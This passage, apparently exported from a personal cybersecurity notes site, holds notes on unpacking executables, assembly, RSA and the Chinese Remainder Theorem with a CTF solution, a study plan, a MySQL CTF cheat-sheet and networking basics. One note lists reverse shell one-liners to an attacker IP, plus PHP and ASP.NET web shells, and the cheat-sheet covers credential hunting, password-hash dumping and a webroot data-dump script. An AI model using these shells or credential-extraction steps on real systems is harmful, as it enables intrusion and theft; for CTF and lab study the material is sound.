has been successfully unpacked. The sections of the unpacked executable file are analyzed and examined: \n\nAs evident from the image, the sections of the unpacked Windows executable file appear in the expected arrangement, resembling a typical unpacked executable. This indicates that the unpacking operation has been carried out successfully.\nThe executable file unpacked via CFF Explorer is not saved as a separate file within the system. If the program is closed, the unpacking process needs to be repeated on the file. However, it is possible to export and save the unpacked executable file using CFF Explorer. To save the unpacked file, the steps “File → Save As” should be followed from the top menu.\n\nIf the steps in the image above are applied, the unpacked version of the executable file will be saved."},"Malware-Analysis/x86-Assembly":{"slug":"Malware-Analysis/x86-Assembly","filePath":"Malware Analysis/x86 Assembly.md","title":"x86 Assembly","links":[],"tags":[],"content":"What is X86 Assembly Language?\nAssembly language can be described as a machine language which is different for each processor. Assembly language is more difficult to understand than other programming languages. Running programs can be analyzed at the processor level only through the assembly language. This training describes the x86 assembly language.\nAT&amp;T and Intel Syntax\nMany syntaxes can be used when expressing commands in the assembly language program flow. “AT&amp;T” and “Intel” syntaxes are two of them. Brief examples of both syntaxes are given below. The syntax to be used in the examples in the training as well as the reverse engineering processes is the “Intel” syntax.\nThe following examples show different syntax versions of the same “main” function. The tool used for disassemble operation is the “objdump” tool.\nAT&amp;T Syntax\nCommand: `sudo objdump -d helloworld\n\nYou can see the “AT&amp;T” syntax roughly in the image above. In the AT&amp;T syntax, which has a different notation than the Intel syntax, the ”%” sign is prefixed to the register names. Another difference is that the direction of operation in MOV instruction is from left to right.\nIntel Syntax\nCommand: `sudo objdump -d -M intel helloworld\n\nThe above image shows the “Intel” syntax\nAddressing Modes\nThe assembly language has many different addressing modes. Some of these are as follows: \nRegister Addressing\nIn this addressing, registers are used as operands. For example:\n`MOV EAX, EBX\nAbove, the operation is applied between two registers. \nImmediate Addressing\nA fixed value is used as the operand in this addressing. For example:\n`MOV EAX, 0x0\nThe operation is applied between the fixed value and the register in the above operation.\nMemory Addressing\nThe memory address is used as the operand in this addressing. For example:\n`MOV EAX, DWORD PTR [ESP]\nThe operation is applied between the memory address and the register in the above operation."},"Misc/Assembly":{"slug":"Misc/Assembly","filePath":"Misc/Assembly.md","title":"Assembly","links":[],"tags":[],"content":"Calling a function\nWhen a function is called, its arguments are stored in following locations and the function is called:\n- 1st arg: rax\n- 2nd arg: rdi\n- 3rd arg: rsi\n- 4th arg: rdx\n- 5th arg: rcx\n- and so on.\ne.g.\n\t; Write hello word to stdout\n\tmov rax, 1        ; syscall number for sys_write\n\tmov rdi, 1        ; file discriptor 1 (stdout)\n\tmov rsi, hello    ; pointer to string\n\tmov rdx, 13       ; length of string\n\tsyscall           ; invoke the system call\nWhat’s with r and e\nWhen looking at assembly code, we will see two kinds of registe, the ones starting with r: rax, rsi, rdx, etc; and others starting with e: eax, esi, edx, etc. The difference between them is just that  registers starting with r are 64-bit and the one starting with e are 32-bit. The thing to keep in mind is that they are not actually separate registers. The r-registers use e-registers to store the lower 32-bits. So, the r-registers are like extensions to e-registers to store larger value.\nIn our above program, we used rax and rdi but the stored value 1 is small and hence compiler will assign eax and edi instead.\nWhat are function prologue and epilogue\nPrologue\nThe function prologue is a few lines of code at the beginning of a function, which prepare the stack and registers for use within the function.\nThe function prologue does following:\n\nPushes current base pointer onto the stack, so it can be restored later.\nValue of base pointer is set to the address of stack pointer (which is pointed to the top of the stack) so that the base pointer will point to the top of the stack.\nMoves the stack pointer further by decreasing or increasing its value, depending on whether the stack grows down or up. On x86, the stack pointer is decreased to make room for the function’s local variables.\n\n\tpush ebp\n\tmov\tebp, esp\n\tsub\tesp, N\nEpilogue\nSimilarly, the function epilogue appears at the end of the function, and restores the stack and registers to the state they were in before the function was called.\nThe function epilogue does following:\n\nDrop the stack pointer to the current base pointer, so room reserved in the prologue for local variables is freed.\nPops the base pointer off the stack, so it is restored to its value before the prologue.\nReturns to the calling function, by popping the previous frame’s program counter off the stack and jumping to it.\n\n\tmov\tesp, ebp\n\tpop\tebp\n\tret\nLooping\nWe use rcx as loop counter. So a loop looks like:\nmov rcx, 5\nmov rax, 0\n \nmy_loop:\n\tadd rax, rcx\n\tloop my_loop\nHere we calculate the sum of numbers from 5 to 0. The loop command decrements the rcx and jumps to my_loop."},"Misc/Chinese-Remainder-Theorem":{"slug":"Misc/Chinese-Remainder-Theorem","filePath":"Misc/Chinese Remainder Theorem.md","title":"Chinese Remainder Theorem","links":[],"tags":[],"content":"Definition\nThe Chinese Remainder Theorem (CRT) solves systems of congruences of the form:\nx \\equiv a_1 \\pmod{n_1} \\\\\nx \\equiv a_2 \\pmod{n_2} \\\\\n\\cdots \\\\\nx \\equiv a_k \\pmod{n_k} \\\\\nwhere all moduli ( n_1, n_2, ..., n_k) are pairwise coprime.\nCRT guarantees there is a unique solution modulo:\nN = n_1 n_2 \\cdots n_k\nFormula\n\n\nCompute the product of moduli:\nN = \\prod_{i=1}^{k} n_i\n\n\nFor each congruence:\n\nCompute ( M_i = \\frac{N}{n_i} )\nFind the modular inverse:\n\n y_i \\equiv M_i^{-1} \\pmod{n_i}\n\n\nConstruct the solution:\nx \\equiv \\sum_{i=1}^{k} a_i \\cdot M_i \\cdot y_i \\pmod{N}\n\n\nExample\nSolve:\nx \\equiv 2 \\pmod{3}, \\quad\nx \\equiv 3 \\pmod{5}, \\quad\nx \\equiv 2 \\pmod{7}\n\nN = 3 \\cdot 5 \\cdot 7 = 105\nFor  n_1 = 3 :\nM_1 = 35, \\; y_1 = 35^{-1} \\pmod{3} = 2\nFor n_2 = 5:\nM_2 = 21, ; y_2 = 21^{-1} \\pmod{5} = 1\nFor n_3 = 7 :\nM_3 = 15, \\; y_3 = 15^{-1} \\pmod{7} = 1\n\nFinal solution:\nx \\equiv 2 \\cdot 35 \\cdot 2 + 3 \\cdot 21 \\cdot 1 + 2 \\cdot 15 \\cdot 1 \\equiv 233 \\equiv 23 \\pmod{105}\nSolution: x = 23 \\pmod{105}\nHTB Challenge Time Capsule Solution\nChallenge: app.hackthebox.com/challenges/Baby%2520Time%2520Capsule\nSolution\nfrom Crypto.Util.number import long_to_bytes\n \nm1 ={&quot;time_capsule&quot;: &quot;8E97BFA6587799EFFD1AC3CF9212E44D35A85128CB930E58B2ABC35291A2968218F866C943E19CEE1582D4C50F59F4A07D980C8BE7F859B4EFD94CEC0518FBE96A671001B2ED899CE2EAD8E122988DFE50532FE885BDE3E906F58BC8418CA5BCA3CAB263E1BB32CE2CDF47842CD9C28D461E2940325766C1275B88F2F866DFF6&quot;, &quot;pubkey&quot;: [&quot;B5AE741C36726CDC699AEB6917ED7E2240BD2ACD3AF3DA65331B7B59F0D2D1DFF908C614E3E464765F31BC5B564E106DF3BF9C0736CD01717D5D376ADE7A2D4EDE7E2E6165E97C8CA530B9584DD77249FDE76B916A84A6ACF43CC3093779FF866EDEB891674FFD7614F59A4A02D56FFA421FB4A4B11FEDD9E66F0098AE435A6B&quot;, &quot;5&quot;]}\n \nm2={&quot;time_capsule&quot;: &quot;445F1D33747A5B8C93C4227ACA8D8DE27EEB16C2CA4CD6FCF1AA377F8BF138AA256EB392BD9F2ED3BC4BD64FAE4477F9035566FC0B6729942A6DF18925A7F7077DCC1232EB6A54046AA78C4A7055E6CCDB22F24E13D87A141D02E565CB64D47A17CD22E09F3FCA6DCA6EB3063DB41B1B614D50BC69E3332FE23B9A2C2CA5B3F1&quot;, &quot;pubkey&quot;: [&quot;7EED83A99566259CCDB2838DB1216DA1BFD4A3A9756C939041902320EE4C66CD91F4A2199CC5239F0E4CE41D6134199A35545C372E20E4B63BFF31DDD48394D164E90958F6BE0E74FD69AB97E347A053F3E1732E070468297E3AD7978E72F319FA725429422D522ADE11779CB25830D29BC62B0BF748C4A426C919EB16B013D1&quot;, &quot;5&quot;]}\n \nm3={&quot;time_capsule&quot;: &quot;1D9641664949D9F54F8B596B1731F630A5E4C9963331716A77A66FAFBBE325921DE249DF1E4D49F0CA6F7CD1EC76AA5569C64BE169B4D4090C93C103781CD8B216E3CED4B7A302352DD8E6A9D6186507D2F8EC6741803B7EB7D68BCC1721EA74B655EDCA173BBE1F15FCD2A500A73ABFA1027BEC9176C95A96CA0171DDF93F9&quot;, &quot;pubkey&quot;: [&quot;4FF06D8B5FB0F48F84B8A69739899421C56E884F2A3E977B8297AF7CDFB964133A28E1869D0BA0D4036EFCCF15FDBE9867BF8A6E74BE678BF323E4F00009F05CFE79E9EB7E69EE98E5533ECCA584189601B22B3ECA8670864AE7D2B50520A3BD6A3071859FA62EB046A8F2E8C25D8FB032C08ABFF2CDE0EA81B88F4FDEB3A6A5&quot;, &quot;5&quot;]}\n \nm4={&quot;time_capsule&quot;: &quot;6D14DA943938D1D5338DD86B414053056FADB9B40DA9661FA1F1ADB136CAFCDEE4895AD30D867AFBE5CB4EC3D5837C6D50E71AB55FD2D11E12BAA781F0F3A335E5AFC2CFC96BC73B8CC1B7E8F6DACD104725A68139A8754B59D0E62A2B1BE33D58DDCC3381CA54DCBF5F1D71AA16F8A0F4F2B79E41A656572BDCDF9D56335A55&quot;, &quot;pubkey&quot;: [&quot;847594B4A66E9968CF8C5F8B45BD03BF00B3D282476ADCADB5AD82B4526E39CC2C0DA4C8651CCB02E20E38C7743D2232E99C67CC8E7A5F2AE2ADB867F0099141E8285D531CF7E496500AA6B619FE6208C2CCD9EDEF1B2232C58BDD3FD2808607EDCEB480F7CC607B0ECD772E50D6DBB9D407F8D0949A867189DBF12CC254897F&quot;, &quot;5&quot;]}\n \nm5={&quot;time_capsule&quot;: &quot;A92FCBADAE66773A3F524D5DC9D3317110DE1FD74F4E18E9440E0DF18DB9F61EF1B7783206B4C927E7B57FE405364734CA012D5362A394D6B97B989D3A664AD1C4FDAC43E97DAD4CA0F259F5A46DEF55FC466E8667491CBA32B098CF4944ABDF6FFCB86E9E2A8DAF32190856F184FAFDFA41D98E50CAA34C002F9A8A4F2EEC71&quot;, &quot;pubkey&quot;: [&quot;C1BCCA8FD2F19A5F17D98DDCEC1DA42F5FA7CBE0E5BFEBBAAE35123036DB76D6705588A0F825618BD972B3D4747884556498030B2B3276D7E15E3E7A84EBC50D04D972A6D59658CE10275D65ACCCF005EA608F754B180362C437744C8E6EF1685BE6BF5933E9C7CB3C52BE1A8A8DB8CD49C1E0ECE6B9A6FFA77F70B474E8B441&quot;, &quot;5&quot;]}\n \nm0={&quot;time_capsule&quot;: &quot;4DC42E112EF1A1A9FEFFE55C23009D456EABFCEFED97E62E3437767C1FC67553E7C3805A948B0742A08A07EA51AB10123DBF25BEE49CC2672ADEEF5B78E9D3961AE386C995ADE9B9BE853BDBEAD3F287560A9919AF5621F6BAD49F69DA6022638D7225C2C6902396BD0A27254EF38361BC9A118133A877015B59DA10733512D8&quot;, &quot;pubkey&quot;: [&quot;CC8E886F6D93C38625EBD50AA371FD64E603348625F56EE918F3C444FBDCC80FA8DEFFCEF9DE4CFEE4E734DB176E7CB4CF0EB19C9F425866AD1D44868846D20E3B6EE6F0984FCC635982ECD9F14594B0503D636212384C719E836891638AAFBEEE64BF7F35EC707617A477DB2E600E40D94F7B319EA7C8F965F340D6EB156451&quot;, &quot;5&quot;]}\n  \n \n# flag**5 = time_capsule (mod pubkey[0])\n \nflag = 0\nm = [m0, m1, m2, m3, m4, m5]\nN= 1\n \nfor i in range(6):\n    N *= int(m[i][&quot;pubkey&quot;][0], 16)\n \nfor i in range(6):\n    n_i = int(m[i][&quot;pubkey&quot;][0], 16)\n    M_i = N // n_i\n    y_i = pow(M_i, -1, n_i)\n    f_i = int(m[i][&quot;time_capsule&quot;], 16)\n \n    flag = (flag + f_i * M_i * y_i) % N\n \ndef root(n, e):\n    &quot;&quot;&quot;Compute the integer nth root of a number.&quot;&quot;&quot;\n \n    mini, maxi = 0, n\n    while mini &lt; maxi:\n        mid = (mini + maxi + 1) // 2\n        if mid ** e &gt; n:\n            maxi = mid - 1\n        else:\n            mini = mid\n \n    return mini\n \n  \n \nm = root(flag, 5)\nflag_bytes = long_to_bytes(m)\nprint(flag_bytes.decode())"},"Misc/RSA-Cryptosystem":{"slug":"Misc/RSA-Cryptosystem","filePath":"Misc/RSA Cryptosystem.md","title":"RSA Cryptosystem","links":[],"tags":[],"content":"Excellent question. These terms are at the heart of modern cryptography, and understanding the distinction is key to solving challenges like the one you did.\nWhat is RSA?\nRSA (Rivest-Shamir-Adleman) is the name of a specific, standardized public-key cryptosystem. It’s the “brand name” algorithm that is one of the oldest and most widely used. Think of it as the original blueprint for this type of security.\nThe RSA algorithm is defined by three distinct phases:\n1. Key Generation (The Setup)\nThis is a precise mathematical process:\n\nChoose two distinct, large random prime numbers, p and q.\nCalculate the modulus n = p * q.\nCalculate Euler’s Totient Function: phi(n) = (p - 1) * (q - 1).\nChoose a public exponent e such that it’s coprime to phi(n). The number 65537 (0x10001) is almost always chosen for e.\nCalculate the private exponent d as the modular inverse of e with respect to phi(n). (i.e., d * e ≡ 1 (mod phi(n))).\n\nThe result is a Public Key (n, e) which you can share with the world, and a Private Key d which you must keep absolutely secret.\n2. Encryption (Sending a Secret Message)\nIf someone wants to send you a secret message m, they use your public key:\n\nCiphertext c = pow(m, e, n)\n\nOnly you can read this message because no one else has the private key d.\n3. Decryption (Reading the Secret Message)\nTo read the ciphertext c, you use your private key:\n\nMessage m = pow(c, d, n)\n\nThe mathematical relationship between d, e, and phi(n) guarantees that this process perfectly reverses the encryption.\nDigital signatures in standard RSA are the same process but with the keys used in reverse: you “encrypt” a message’s hash with your private key to sign it, and others can “decrypt” it with your public key to verify it."},"Misc/Study-Plan/Phase-0-–-Web-Foundations":{"slug":"Misc/Study-Plan/Phase-0-–-Web-Foundations","filePath":"Misc/Study Plan/Phase 0 – Web Foundations.md","title":"Phase 0 – Web Foundations","links":["tags/web","tags/foundation"],"tags":["web","foundation"],"content":"Phase 0 – Web Security Foundations (2 Weeks)\nTag: web foundation\n🧠 Goal:\nUnderstand HTTP, Burp, OWASP basics\nSolve easy web CTFs\nPrepare for Phase 1\n\n📅 Day 1,2,3 – HTTP + Burp Basics\n\n MDN HTTP Overview\n TryHackMe – HTTP in Detail\n Set up Burp Proxy + Repeater\n Practice intercepting login form and modifying parameters \n Use whatweb, gobuster on basic web targets\n\n\n📅 Day 4,5,6 – OWASP Top 5 Vulns\n\n TryHackMe – OWASP Top 10 room\n PortSwigger Labs:\n\n XSS\n SQL Injection\n IDOR\n\n\n Practice:\n\n&#039; OR 1=1-- in login\nalert(1) in search/comment\n../etc/passwd for file traversal\n\n\n\n\n📅 Day 7,8,9 – Full CTF Practice\n\n TryHackMe Boxes:\n\n Basic Pentesting\n Juice Shop / Django Unchained\n\n\n HackTheBox: Lame / Oopsie\n Practice full recon → exploit → writeup\n\n\n📅 Day 10,11,12 – DVWA + Review\n\n Set up DVWA locally (XAMPP / Docker)\n Complete all “Low” and “Medium” level:\n\n SQLi\n XSS\n Command Injection\n\n\n Review OWASP + Burp usage\n\n\n✅ Exit Criteria\n\n Confident with HTTP requests and web app structure\n Used Burp Proxy + Repeater for real tasks\n Solved 3 beginner CTFs and wrote mini writeups\n"},"Misc/Study-Plan/Phase-1-–-Advanced-Web-Exploitation":{"slug":"Misc/Study-Plan/Phase-1-–-Advanced-Web-Exploitation","filePath":"Misc/Study Plan/Phase 1 – Advanced Web Exploitation.md","title":"Phase 1 – Advanced Web Exploitation","links":["tags/web","tags/advanced"],"tags":["web","advanced"],"content":"Phase 1 – Advanced Web Exploitation (6 Weeks)\nTag: web advanced\n🧠 Goal:\nMaster full-stack web attack flow\nSolve medium CTFs, IDORs, SSRF, JWT, auth bypass\nAutomate using Python + Burp\n\n📅 Week 1 – Web Recon + Tech Stacks\n\n Use whatweb, nmap, gobuster, httpx\n Fingerprint target: headers, cookies, tech stack\n Automate basic recon using Python (requests)\n\n\n📅 Week 2 – Auth + Session Attacks\n\n PortSwigger Labs:\n\n Broken Auth\n Session Fixation\n JWT None Bypass\n\n\n TryHackMe: Pick 2 web auth boxes\n Write 1 writeup on auth bypass\n\n\n📅 Week 3 – XSS + CSRF Advanced\n\n PortSwigger: DOM XSS, stored XSS, XSS in JSON\n Write 1 payload chain for cookie stealing\n Solve XSS challenges on XSS Game or HackTheBox\n\n\n📅 Week 4 – IDOR + Access Control\n\n PortSwigger Labs:\n\n Insecure Direct Object Reference\n Priv Esc via access control bypass\n\n\n Write automated IDOR tester (Python)\n\n\n📅 Week 5 – SSRF + File Upload + RCE\n\n SSRF with Burp Collaborator\n LFI → RCE chaining (log poisoning, wrapper)\n PortSwigger: SSRF + File upload labs\n Juice Shop: SSRF challenge\n\n\n📅 Week 6 – Bug Bounty Simulation + Writeup\n\n Simulate bug bounty on DVWA/BWAPP:\n\n Find 3 bugs\n Write clean report: summary, PoC, fix\n\n\n Post writeup on GitHub / Medium\n\n\n✅ Exit Criteria\n\n Comfortable with full attack flow\n 4+ writeups posted (auth, SSRF, IDOR, XSS)\n Tools: Burp Pro (if available), Collaborator, Python scripts\n"},"Misc/Study-Plan/Phase-2-–-Reversing-+-Exploit-Dev":{"slug":"Misc/Study-Plan/Phase-2-–-Reversing-+-Exploit-Dev","filePath":"Misc/Study Plan/Phase 2 – Reversing + Exploit Dev.md","title":"Phase 2 – Reversing + Exploit Dev","links":["tags/reversing","tags/pwn","tags/exploitdev"],"tags":["reversing","pwn","exploitdev"],"content":"Phase 2 – Reversing + Exploit Dev (6 Weeks)\nTag: reversing pwn exploitdev\n🧠 Goal:\nMaster Ghidra + x64 assembly\nWrite working exploits for BOF, ROP, and simple malware\nRecommended Course: apps.p.ost2.fyi/learning/course/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/home\n\n📅 Week 1 – Ghidra + ELF Analysis\n\n Analyze main() function, strings, conditions\n Label strcmp, scanf, control flow\n crackmes.one – solve 2 “easy” binaries\n Write pseudocode of binary logic\n\n\n📅 Week 2 – Assembly + Manual RE\n\n Practice C → asm at godbolt.org\n Learn registers: rax, rdi, rsi, rbp, rsp\n crackmes.one – 2 medium binaries\n Patch check using Cutter / HxD\n\n\n📅 Week 3 – Keygenning + Obfuscation\n\n Identify serial logic, checksum\n Patch/Keygen 2 Windows crackmes\n Tools: x64dbg, PE-bear, Ghidra\n\n\n📅 Week 4 – Basic Exploitation (ret2win)\n\n ROP Emporium:\n\n ret2win\n split\n\n\n pwntools: remote(), sendline(), payload()\n Write your first working exploit\n\n\n📅 Week 5 – ROP Chains + Leak\n\n ROP Emporium:\n\n write4\n pivot\n\n\n Leak libc → call system(“/bin/sh”)\n Use pwndbg + Ropper + pwntools\n\n\n📅 Week 6 – Malware RE\n\n Analyze 1 sample from MalwareBazaar (safe sample)\n Use PEStudio, strings, ProcMon\n Write 1-page report: behavior, IOCs, persistence\n\n\n✅ Exit Criteria\n\n 5+ working pwntools exploits\n 2 binaries patched or keygenned\n 1 malware RE report\n 3 writeups posted on GitHub/blog\n"},"Misc/Study-Plan/The-Study-Plan":{"slug":"Misc/Study-Plan/The-Study-Plan","filePath":"Misc/Study Plan/The Study Plan.md","title":"The Study Plan","links":["tags/cybersecurity","tags/learning-plan","Misc/Study-Plan/Phase-0-–-Web-Foundations","Misc/Study-Plan/Phase-1-–-Advanced-Web-Exploitation","Misc/Study-Plan/Phase-2-–-Reversing-+-Exploit-Dev"],"tags":["cybersecurity","learning-plan"],"content":"🛡️ Cybersecurity Master Plan – 18 Weeks\nTag: cybersecurity learning-plan\nThis is my study Plan generated by ChatGPT tailored for me. It focuses on getting started on web exploitation and reversing/exploit dev.\n🎯 Overview\n\n🚀 Phase 0 – Web Foundations (4 Weeks)\n🔥 Phase 1 – Advanced Web Exploitation (6 Weeks)\n🔥 Phase 2 – Reversing + Exploit Dev (6 Weeks)\n💥 Weekly CTFs and writeups in parallel\n✅ Build GitHub, Resume, Portfolio\n\n\n🧭 Phases\n\nPhase 0 – Web Foundations\nPhase 1 – Advanced Web Exploitation\nPhase 2 – Reversing + Exploit Dev\n\n\n🧰 Tools Checklist\n\n Burp Suite (Community)\n Firefox + FoxyProxy\n Ghidra\n GDB + pwndbg\n pwntools\n TryHackMe, HackTheBox\n gobuster, wfuzz\n"},"Misc/mysql":{"slug":"Misc/mysql","filePath":"Misc/mysql.md","title":"mysql","links":[],"tags":[],"content":"MySQL CTF Cheat-sheet\nQuick connect (preferred order)\n# 1) local socket (best)\nmysql -u root -p -S /var/run/mysqld/mysqld.sock -D hacker\n \n# 2) explicit local TCP\nmysql -u root -p -h 127.0.0.1 -P 3306 -D hacker\n \n# 3) ephemeral\nmysql -u root -p&#039;mUsQ6kQ6L86yRnzD&#039; -D hacker\nNote: use socket when available — avoids TCP restrictions.\n\nFast reconnaissance (run after connecting)\nSHOW DATABASES;\nUSE hacker;\nSHOW TABLES;\n-- quick schema peek\nDESCRIBE &lt;table&gt;;\nSHOW CREATE TABLE &lt;table&gt;;\nExplain: information_schema is your index for meta-queries if DB is large.\n\nFind likely targets (columns/tables with secrets)\n-- columns that scream secret\nSELECT table_name, column_name\nFROM information_schema.columns\nWHERE table_schema=&#039;hacker&#039;\n  AND column_name REGEXP &#039;pass|passwd|password|secret|token|key|flag&#039;\nORDER BY table_name;\n \n-- tables containing the word &#039;flag&#039; (fast)\nSELECT table_name\nFROM information_schema.tables\nWHERE table_schema=&#039;hacker&#039; AND table_name LIKE &#039;%flag%&#039;;\nExplain: search information_schema first — non-destructive and fast.\n\nGrep-like content search (CTF gold)\n-- find text columns in a table\nSELECT column_name FROM information_schema.columns\n WHERE table_schema=&#039;hacker&#039; AND table_name=&#039;notes&#039; AND DATA_TYPE IN (&#039;text&#039;,&#039;varchar&#039;,&#039;longtext&#039;);\n \n-- generate a search query for a table (run the output)\nSELECT CONCAT(&#039;SELECT * FROM `&#039;, table_name, &#039;` WHERE &#039;,\n       GROUP_CONCAT(CONCAT(&#039;`&#039;,column_name,&#039;` LIKE \\&quot;%flag%\\&quot;&#039;) SEPARATOR &#039; OR &#039;),\n       &#039; LIMIT 20;&#039;) AS q\nFROM information_schema.columns\nWHERE table_schema=&#039;hacker&#039; AND data_type IN (&#039;varchar&#039;,&#039;text&#039;,&#039;longtext&#039;)\nGROUP BY table_name;\nExplain: generate then run the produced SELECTs — good for broad searches.\n\nQuick data peeks (do not dump unnecessary rows)\nSELECT * FROM users LIMIT 10;\nSELECT id,username,password FROM users ORDER BY id DESC LIMIT 50;\nSELECT * FROM logs ORDER BY id DESC LIMIT 30;\nOpinion: inspect small samples before dumping whole tables.\n\nExport / dump (if allowed)\n# dump DB (fast)\nmysqldump -u root -p hacker &gt; /tmp/hacker.sql\n \n# dump specific table\nmysqldump -u root -p hacker secrets &gt; /tmp/secrets.sql\nIf mysqldump unavailable, use PHP to iterate tables and write JSON files.\n\nUsing webapp as proxy (when direct access blocked)\n// run via CLI or place in webroot temporarily\n&lt;?php\n$pdo=new PDO(&#039;mysql:host=localhost;dbname=hacker&#039;,&#039;root&#039;,&#039;PASS&#039;,[PDO::ATTR_ERRMODE=&gt;PDO::ERRMODE_EXCEPTION]);\nforeach($pdo-&gt;query(&quot;SHOW TABLES&quot;) as $t){\n  $table=array_values($t)[0];\n  file_put_contents(&quot;/tmp/{$table}.json&quot;, json_encode($pdo-&gt;query(&quot;SELECT * FROM `{$table}` LIMIT 200&quot;)-&gt;fetchAll(PDO::FETCH_ASSOC), JSON_PRETTY_PRINT));\n}\necho &quot;dumped\\n&quot;;\n?&gt;\nExplain: webapp runs as env that can access DB — use it to extract when client blocked.\n\nIf DB service is down — filesystem recovery (no bs)\n# datadir common locations\nls -lah /var/lib/mysql\nfind / -type f \\( -name &#039;ibdata1&#039; -o -name &#039;*.ibd&#039; -o -name &#039;*.frm&#039; \\) 2&gt;/dev/null\n \n# quick heuristic for plaintexts\nstrings /var/lib/mysql/hacker/* | egrep -i &#039;flag|password|passwd|secret|token|admin&#039; | less\nOpinion: raw InnoDB recovery is hard. Always copy datadir (snapshot) before touch.\n\nStarting a throwaway mysqld on copied datadir\n# copy datadir safely (as root)\ncp -a /var/lib/mysql /tmp/mysql-snapshot\n \n# start mysqld pointing to snapshot (run as mysql user if needed)\nsudo mysqld --datadir=/tmp/mysql-snapshot --socket=/tmp/mysqld.sock --skip-networking &amp;\nmysql -u root -S /tmp/mysqld.sock -D hacker\nExplain: use --skip-networking to avoid exposing to network.\n\nFiles &amp; blob tricks\n-- read file if FILE privilege and path readable by mysqld\nSELECT LOAD_FILE(&#039;/etc/hostname&#039;);\n \n-- write table to file (requires OUTFILE privilege and writable path)\nSELECT * FROM users INTO OUTFILE &#039;/tmp/users.csv&#039; FIELDS TERMINATED BY &#039;,&#039; LINES TERMINATED BY &#039;\\n&#039;;\nWarning: FILE/OUTFILE often disabled in hardened CTFs, but check.\n\nPrivilege &amp; user checks (escalation)\nSELECT user, host, authentication_string FROM mysql.user;\nSHOW GRANTS FOR CURRENT_USER();\nOpinion: if you can read mysql.user, you can potentially escalate or extract hashes.\n\nFast filesystem searches for creds (from host)\n# find config files with DB creds\ngrep -R --line-number -i &quot;password&quot; /var/www /srv /etc 2&gt;/dev/null | egrep &#039;mysql|pdo|mysqli|db&#039;\n \n# list DB folder (quick hint of table names)\nls -lah /var/lib/mysql/hacker\nExplain: app code often stores credentials; code search sometimes faster than DB queries.\n\nOne-liners I use always\n# list tables quickly via filesystem\nls -1 /var/lib/mysql/hacker\n \n# search DB files for obvious strings\nstrings /var/lib/mysql/hacker/* | egrep -i &#039;flag|password|secret|admin&#039; | head"},"Misc/revshell":{"slug":"Misc/revshell","filePath":"Misc/revshell.md","title":"revshell","links":[],"tags":[],"content":"Reverse Shell Payloads\nListener: nc -lnvp 4444\nAttacker IP: 10.8.47.165\nPort: 4444\nBash\nbash -i &gt;&amp; /dev/tcp/10.8.47.165/4444 0&gt;&amp;1\nNetcat\nnc -e /bin/bash 10.8.47.165 4444\nPython 3\npython3 -c &#039;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.47.165&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#039;\nPHP\nphp -r &#039;$sock=fsockopen(&quot;10.8.47.165&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#039;\nPerl\nperl -e &#039;use Socket;$i=&quot;10.8.47.165&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#039;\nWeb Shell Payloads\nPHP (shell.php)\n&lt;?php system($_GET[&#039;cmd&#039;]); ?&gt;\nUsage: http://&lt;target&gt;/shell.php\nASP.NET (shell.aspx)\n&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;script runat=&quot;server&quot;&gt;void Page_Load(object s, EventArgs e){if(Request.QueryString[&quot;cmd&quot;]!=null){Process p=new Process();p.StartInfo.FileName=&quot;cmd.exe&quot;;p.StartInfo.Arguments=&quot;/c &quot;+Request.QueryString[&quot;cmd&quot;];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(&quot;&lt;pre&gt;&quot;+p.StandardOutput.ReadToEnd()+&quot;&lt;/pre&gt;&quot;);}}&lt;/script&gt;\nUsage: http://&lt;target&gt;/shell.aspx\nUpgrading Reverse Shell to Full TTY\nStep 1: Spawn a better shell\nIn the reverse shell, use Python to spawn a PTY.\npython3 -c &#039;import pty; pty.spawn(&quot;/bin/bash&quot;)&#039;\nor if Python 3 is not available:\npython -c &#039;import pty; pty.spawn(&quot;/bin/bash&quot;)&#039;\nStep 2: Background and set STTY\n\nPress Ctrl+Z to background the shell.\nIn your local attacker terminal, run:\nstty raw -echo; fg\n\nPress Enter once or twice. Your terminal will look strange, but it’s working.\n\nStep 3: Set environment variables\nIn the now-interactive reverse shell, run:\nreset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty rows 38 cols 190  # Adjust to your terminal&#039;s size (check with `stty size` locally)\nYou now have a fully functional TTY with tab completion, arrow keys, and Ctrl+C.\nAlternative: Socat\nIf socat is on the target, use it for an instant full TTY.\nAttacker Listener:\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\nVictim Payload:\nsocat exec:&#039;bash -li&#039;,pty,stderr,setsid,sigint,sane tcp:10.8.47.165:4444"},"Networking/ARP":{"slug":"Networking/ARP","filePath":"Networking/ARP.md","title":"ARP","links":["Networking/Mac-Address","Networking/IP-Address","Networking/Port"],"tags":[],"content":"Address Resolution Protocol (ARP) is used to get Mac Address of a host from using its IP Address.\nHow ARP Works\nWhen a host needs to find Mac Address of destination device in same network, following steps are followed by the host.\n1. ARP REQUEST\nAn Ethernet Broadcast is sent by the host with the IP Address of destination device.\nNote:\n\nRouters do not forward broadcasts.\nEthernet broadcast are frames with their destination address FF:FF:FF:FF:FF:FF or FFFF.FFFF.FFFF.\nSwitches flood broadcasts to all ports except the incoming Port.\n\n2. ARP REPLY\nThe host with the matching IP Address sends its Mac Address back to the original sending host.\n3. ARP Table\nWhen the sending host receives the message, it stores the Mac Address and IP Address information in a table called an ARP table."},"Networking/Bandwidth-vs-Throughput":{"slug":"Networking/Bandwidth-vs-Throughput","filePath":"Networking/Bandwidth vs Throughput.md","title":"Bandwidth vs Throughput","links":[],"tags":[],"content":"Bandwidth\nIt is the total capacity of a network to transfer data over an interval of time. It is measured in kbps, mbps, gbps.\nThroughput\nIt is also the capacity of network to transfer data but also considers latency and other factors.\nIt means bandwidth is how much it can transfer and 